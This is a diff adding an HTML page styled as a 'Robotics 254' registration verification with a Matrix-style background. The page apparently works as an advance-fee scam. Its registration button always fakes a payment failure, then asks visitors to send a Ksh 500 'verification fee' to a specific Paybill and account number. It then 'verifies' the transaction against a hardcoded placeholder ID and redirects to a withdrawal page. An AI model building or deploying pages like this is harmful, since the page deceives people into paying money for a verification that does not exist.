@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification - Robotics 254</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+
+        canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        .container {
+            position: relative;
+            max-width: 400px;
+            margin: 100px auto;
+            padding: 20px;
+            background: rgba(0, 0, 50, 0.8);
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+        }
+
+        h2 {
+            margin-bottom: 10px;
+        }
+
+        .pay-btn, .manual-btn, .verify-btn {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+
+        .pay-btn {
+            background-color: #4CAF50;
+            color: white;
+        }
+
+        .pay-btn.clicked {
+            background-color: red;
+        }
+
+        .manual-btn {
+            background-color: #007BFF;
+            color: white;
+        }
+
+        .verify-btn {
+            background-color: #28A745;
+            color: white;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .spinner {
+            display: none;
+            width: 30px;
+            height: 30px;
+            border: 5px solid rgba(0, 255, 0, 0.3);
+            border-top: 5px solid #0F0;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        input {
+            width: 100%;
+            padding: 8px;
+            margin-top: 5px;
+            border-radius: 5px;
+            border: none;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <canvas id="matrixCanvas"></canvas>
+
+    <div class="container">
+        <h2>Verify your registration and access payment</h2>
+
+        <button class="pay-btn" onclick="processPayment()">complete registration</button>
+        <div class="spinner" id="spinner"></div>
+
+        <button class="manual-btn hidden" onclick="showManualPayment()">Try Manual</button>
+
+        <div id="manualSection" class="hidden">
+            <p>Pay verification fee of <strong>Ksh 500</strong> to Paybill <strong>522522</strong></p>
+            <p>Acc. No: <strong>1318743346</strong></p>
+
+            <input type="text" id="transactionID" placeholder="Input your Transaction ID">
+
+            <button class="verify-btn" onclick="verifyTransaction()">Verify</button>
+        </div>
+    </div>
+
+    <script>
+        function processPayment() {
+            let payBtn = document.querySelector(".pay-btn");
+            let spinner = document.getElementById("spinner");
+            let manualBtn = document.querySelector(".manual-btn");
+
+            payBtn.classList.add("clicked");
+            spinner.style.display = "block";
+
+            setTimeout(() => {
+                alert("Payment failed. Try manual verification.");
+                spinner.style.display = "none";
+                manualBtn.classList.remove("hidden");
+            }, 10000);
+        }
+
+        function showManualPayment() {
+            document.getElementById("manualSection").classList.remove("hidden");
+        }
+
+        function verifyTransaction() {
+            let userTransactionID = document.getElementById("transactionID").value;
+            let adminTransactionID = "ABC123";  // Replace with actual stored transaction ID
+
+            if (userTransactionID === adminTransactionID) {
+                alert("Verification successful, Glad to work with you.");
+                window.location.href = "withdraw.html";
+            } else {
+                alert("Invalid transaction ID");
+            }
+        }
+
+        // CMatrix Background Effect
+        const canvas = document.getElementById("matrixCanvas");
+        const ctx = canvas.getContext("2d");
+
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        const matrix = letters.split("");
+
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+
+        function drawMatrix() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.fillStyle = "#0F0";
+            ctx.font = fontSize + "px monospace";
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = matrix[Math.floor(Math.random() * matrix.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+
+        setInterval(drawMatrix, 50);
+    </script>
+
+</body>
+</html>
